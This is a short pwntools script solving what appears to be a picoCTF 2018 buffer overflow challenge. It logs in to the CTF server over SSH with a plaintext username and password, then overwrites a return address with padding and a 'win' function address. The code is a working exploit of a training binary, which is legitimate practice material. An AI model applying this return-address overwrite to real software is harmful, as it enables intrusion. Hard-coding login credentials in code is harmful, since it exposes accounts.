# python2
# coding=utf-8
from pwn import *

win=0x080485cb
vuln=0x80486ae

ret=0xffffd5cc
start_get=0xffffd5a0

padding=ret-start_get

s=ssh(host='2018shell3.picoctf.com', user='Zeze', password='casper1014')
s.set_working_directory('/problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba')
p=s.process('./vuln')
p.recvuntil('Please enter your string:')
p.sendline('a'*padding+p32(win))
print p.recvall()

'''
p=process('./vuln')
p.recvuntil('Please enter your string:')
p.sendline('a'*padding + p32(win))
print p.recvall()
'''
